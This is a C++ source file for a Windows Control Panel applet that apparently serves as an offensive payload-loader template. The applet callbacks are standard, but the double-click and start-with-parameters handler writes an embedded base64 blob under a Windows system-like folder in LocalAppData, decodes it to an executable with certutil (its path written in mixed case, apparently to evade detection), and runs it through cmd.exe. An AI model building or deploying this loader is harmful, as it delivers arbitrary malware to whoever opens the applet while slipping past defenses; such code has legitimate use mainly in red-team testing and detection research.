
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include "ControlPanelApplet.h"
#include "Data.h"
#include <stdio.h>
using namespace std;

namespace ControlPanelApplet
{
	CControlPanelApplet* CControlPanelApplet::m_pThis = NULL;

	CControlPanelApplet::CControlPanelApplet() 
	{
		m_pThis = this;		
	}

	// Callback members
	LONG APIENTRY CControlPanelApplet::CPlApplet(HWND hWnd, UINT uMsg, LONG lParam1, LONG lParam2)
	{
	 CControlPanelApplet* pApplet = m_pThis;
	
	 switch (uMsg)
	 {
	  case CPL_DBLCLK:
		return pApplet->OnDblclk(hWnd, lParam1, lParam2);

	  case CPL_EXIT:
		return 0;

	  case CPL_GETCOUNT:
		return 1;

	  case CPL_INIT:
		return 1;

	  case CPL_INQUIRE:
		return pApplet->OnInquire(lParam1, (CPLINFO*)lParam2);

	  case CPL_NEWINQUIRE:
		return pApplet->OnNewInquire(lParam1, (NEWCPLINFO*)lParam2);

	  case CPL_STOP:
		return 1;

	  case CPL_STARTWPARMS:
		return pApplet->OnDblclk(hWnd, lParam1, lParam2);

	  default:
		break;
	 }
	 return 1;
	}

	LONG CControlPanelApplet::OnInquire(UINT uAppNum, CPLINFO* pInfo)
	{
		pInfo->idIcon = IDI_ICON1;
		pInfo->lData = 0;
		pInfo->idName = m_nNameID;
		pInfo->idInfo = m_nDescID;

		return 0;
	}

	LONG CControlPanelApplet::OnNewInquire(UINT uAppNum, NEWCPLINFO* pInfo)
	{
		pInfo->dwSize = (DWORD)sizeof(NEWCPLINFO);
		pInfo->dwFlags = 0;
		pInfo->dwHelpContext = 0;
		pInfo->lData = 0;
		pInfo->szHelpFile[ 0 ] = '\0';
		   
		LoadString( NULL, m_nNameID, pInfo->szName, 32 );
		LoadString( NULL, m_nDescID, pInfo->szInfo, 64 );

		return 1;
	}

	LONG CControlPanelApplet::OnDblclk(HWND hWnd, UINT uAppNum, LONG lData)
	{
		
		//Write base64 payload to file
		char* appdatapath = getenv("LOCALAPPDATA");
		CHAR base64path[100];
		CHAR targetpath[100];
		strcpy(base64path, appdatapath);
		strcat(base64path, "\\Microsoft\\Windows\\1033\\YourEncodedPayload.1"); //base64 encoded
		strcpy(targetpath, appdatapath);
		strcat(targetpath, "\\Microsoft\\Windows\\1033\\YourDecodedPayload.exe"); //base64 decoded and converted to exe

		FILE* fp = fopen(base64path, "wb");
		if (fp == NULL) {
			return -1;
		}
		// write the entire array to the file without.
		fwrite(base64, sizeof(base64[0]), sizeof(base64), fp);
		fclose(fp);		

		//Base64 decode into target exe using certutil
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		si.wShowWindow = SW_SHOW;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		char* winpath = getenv("WINDIR");
		
		CHAR certutil_path[100];	
		strcpy(certutil_path, winpath);
		strcat(certutil_path, "\\sYsTem32\\cerTUTil.exe");
		CHAR certutil_args[500];
		strcpy(certutil_args, " -decode ");
		strcat(certutil_args, base64path);
		strcat(certutil_args, " ");
		strcat(certutil_args, targetpath);

		if (CreateProcessA(&certutil_path[0], &certutil_args[0], 0, 0, FALSE, 0, 0, 0, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, 10000);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		
		//Run decoded app
		CHAR cmd_path[100];
		strcpy(cmd_path, winpath);
		strcat(cmd_path, "\\sYsTem32\\cMd.exe");
		CHAR cmd_args[500];
		strcpy(cmd_args, " /c ");
		strcat(cmd_args, targetpath);		

		if (CreateProcessA(&cmd_path[0], &cmd_args[0], 0, 0, FALSE, 0, 0, 0, &si, &pi))
		{
			WaitForSingleObject(pi.hProcess, 10000);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}

		return 0;
	}
}